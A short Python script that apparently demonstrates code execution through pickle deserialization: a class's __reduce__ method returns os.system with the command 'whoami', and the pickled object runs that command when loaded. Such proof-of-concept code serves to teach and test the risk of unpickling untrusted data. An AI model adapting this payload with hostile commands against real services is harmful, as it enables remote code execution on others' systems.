import os
import pickle


class Test(object):
    def __reduce__(self):
        return (os.system, ('whoami',))


a = Test()
payload = pickle.dumps(a)
print(payload)
pickle.loads(payload)
